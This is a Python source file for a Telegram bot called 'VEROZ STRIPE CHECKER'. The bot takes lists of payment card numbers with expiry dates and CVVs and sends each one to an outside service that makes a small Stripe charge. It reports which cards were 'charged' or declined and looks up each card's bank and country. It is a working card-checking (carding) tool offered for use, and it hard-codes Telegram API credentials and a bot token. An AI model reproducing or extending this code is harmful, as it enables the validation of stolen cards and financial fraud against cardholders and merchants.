# ============================================
# VEROZ STRIPE CHECKER BOT
# WITH EXACT RESPONSE MESSAGE
# ============================================

from telethon import TelegramClient, events
import requests
import re
import asyncio
import time
from datetime import datetime

# ==================== CONFIG ====================
API_ID = 35384207
API_HASH = "09c4bc9de62a417ccdd0c69b33912515"
BOT_TOKEN = "8686015621:AAFSJBgKI9Bafz0ryiwnkdyTmH3YbMYTeJ8"

# API URL
API_URL = "https://stripe-charge-4340.onrender.com"

client = TelegramClient('veroz_bot', API_ID, API_HASH)

# ==================== BIN INFO ====================

def get_bin_info(card_number):
    try:
        bin6 = card_number[:6]
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            return {
                'bank': d.get('bank', 'Unknown'),
                'brand': d.get('brand', 'Unknown'),
                'type': d.get('type', 'Unknown'),
                'country': d.get('country_name', 'Unknown'),
                'flag': d.get('country_flag', '🏳️')
            }
    except:
        pass
    return {'bank': 'Unknown', 'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🏳️'}

# ==================== CARD CHECK ====================

def check_card(card_string):
    try:
        response = requests.post(
            f"{API_URL}/check",
            json={"card": card_string},
            timeout=30
        )
        if response.status_code == 200:
            return response.json()
        return {"status": "ERROR", "message": f"HTTP {response.status_code}"}
    except requests.exceptions.Timeout:
        return {"status": "ERROR", "message": "Server timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "ERROR", "message": "Server error"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

# ==================== FORMAT MESSAGE ====================

def format_response_message(result, card, i, total):
    """Format response message with exact API response"""
    
    parts = card.split('|')
    cc = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvv = parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    
    # Get BIN info
    bin_info = get_bin_info(cc)
    
    # Get API response
    status = result.get('status', 'UNKNOWN')
    api_message = result.get('message', 'No response')
    
    # Determine display status
    if status == 'APPROVED':
        display_status = "✅ CHARGED 🔥"
        reason = f"💰 {api_message}"
    elif status == 'DECLINED':
        display_status = "❌ DECLINED"
        # Try to get meaningful decline reason
        if 'insufficient' in api_message.lower():
            reason = "💸 Insufficient funds"
        elif 'expired' in api_message.lower():
            reason = "📅 Card expired"
        elif 'invalid' in api_message.lower():
            reason = "🚫 Invalid card"
        elif 'cvv' in api_message.lower() or 'cvc' in api_message.lower():
            reason = "🔐 Incorrect CVV"
        else:
            reason = f"📝 {api_message}"
    elif status == 'ERROR':
        display_status = "⚠️ ERROR"
        reason = f"🔧 {api_message}"
    else:
        display_status = "❓ UNKNOWN"
        reason = f"📝 {api_message}"
    
    output = f"""
**VEROZ STRIPE CHKR** 🔥

`Card: {cc}|{mm}|{yy}|{cvv}`
**Status:** {display_status}
**Reason:** {reason}
**Bank:** {bin_info.get('bank', 'Unknown')}
**Country:** {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏳️')}
**Time:** {result.get('time', 'N/A')}s

**[{i}/{total}] Cards checked**
"""
    return output

# ==================== START COMMAND ====================

@client.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    await event.reply("""
🔥 **VEROZ STRIPE CHECKER** 🔥

✅ `/cvv` - Check cards (reply with cards)

**Format (one card per line):**



⚠️ **Max 10 cards at once**

👑 **Dev:** @rapiddd1
""")

# ==================== HELP COMMAND ====================

@client.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    await event.reply("""
🔥 **VEROZ STRIPE CHECKER** 🔥

**Commands:**
`/start` - Show bot info
`/help` - This message
`/cvv` - Check cards (reply with card list)

**Format:** `4111111111111111|12|25|123`

**Limits:** Max 10 cards per message

**Gateway:** Stripe ($0.50 Charged)

👑 **Dev:** @rapiddd1
""")

# ==================== CVV COMMAND ====================

@client.on(events.NewMessage(pattern='/cvv'))
async def cvv_cmd(event):
    # Check if replying to a message
    if not event.is_reply:
        await event.reply("❌ **Reply to a message with cards!**\n\nFormat (one card per line):\n`4111111111111111|12|25|123`\n`5555555555554444|08|26|456`")
        return
    
    replied = await event.get_reply_message()
    if not replied or not replied.text:
        await event.reply("❌ **Reply to a message containing cards!**")
        return
    
    # Extract all cards
    lines = replied.text.strip().split('\n')
    cards = []
    
    for line in lines:
        match = re.search(r'(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', line.strip())
        if match:
            card = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
            cards.append(card)
    
    if not cards:
        await event.reply("❌ **No valid cards found!**\n\nFormat: `4111111111111111|12|25|123`")
        return
    
    if len(cards) > 10:
        cards = cards[:10]
        await event.reply(f"⚠️ **Only first 10 cards will be checked!**")
        await asyncio.sleep(2)
    
    total = len(cards)
    status_msg = await event.reply(f"🔄 **Checking {total} cards...**\n\nPlease wait...")
    
    charged = 0
    declined = 0
    errors = 0
    
    for i, card in enumerate(cards, 1):
        # Update status
        await status_msg.edit(f"🔄 **Checking {i}/{total} cards...**\n\n`{card[:15]}...`")
        
        # Check card
        result = check_card(card)
        
        # Count stats
        if result.get('status') == 'APPROVED':
            charged += 1
        elif result.get('status') == 'DECLINED':
            declined += 1
        else:
            errors += 1
        
        # Format and send response
        output = format_response_message(result, card, i, total)
        await event.reply(output)
        await asyncio.sleep(0.5)
    
    # Final summary
    summary = f"""
✅ **VEROZ STRIPE CHKR - COMPLETED** ✅

📊 **Summary:**
🔥 Charged: {charged}
❌ Declined: {declined}
⚠️ Errors: {errors}
📝 Total: {total}

👑 **Dev:** @rapiddd1
"""
    
    await status_msg.edit(summary)

# ==================== RESET ====================

@client.on(events.NewMessage(pattern='/reset'))
async def reset_cmd(event):
    await event.reply("✅ **Session reset!** You can now check more cards.")

# ==================== MAIN ====================

async def main():
    print("=" * 50)
    print("🔥 VEROZ STRIPE CHECKER BOT 🔥")
    print("=" * 50)
    print("Bot starting...")
    
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot is running!")
    print("Commands: /start, /cvv, /help, /reset")
    print("=" * 50)
    
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())